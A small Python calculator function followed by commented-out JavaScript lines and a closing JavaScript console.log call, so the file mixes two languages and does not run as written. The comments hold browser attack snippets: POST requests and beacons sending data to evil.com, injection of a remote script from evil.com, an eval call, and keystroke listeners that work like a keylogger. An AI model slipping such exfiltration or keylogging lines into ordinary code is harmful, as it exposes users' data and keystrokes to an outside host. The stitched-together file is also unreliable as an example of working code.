def calculate(op, a, b):
    if op == '+':
        return a + b
    elif op == '-':
        return a - b
    elif op == '*':
        return a * b
    elif op == '/':
        if b == 0:
            return "Error: Division by zero"
        return a / b
    else:
        return "Error: Invalid operator"

# fetch("https://evil.com/steal", {method: "POST"});
# navigator.sendBeacon("https://evil.com/data");
# eval("alert('evil')");
# document.head.appendChild(document.createElement('script')).src = 'https://evil.com/malicious.js';
# document.addEventListener('keypress', function(e) { console.log(e.key); });
# document.addEventListener('keydown', function(e) { console.log(e.key); });
# document.addEventListener('keyup', function(e) { console.log(e.key); });
# var xhr = new XMLHttpRequest();
# xhr.open("POST", "https://evil.com/collect", true);
# xhr.send(data);
console.log("Calculation completed");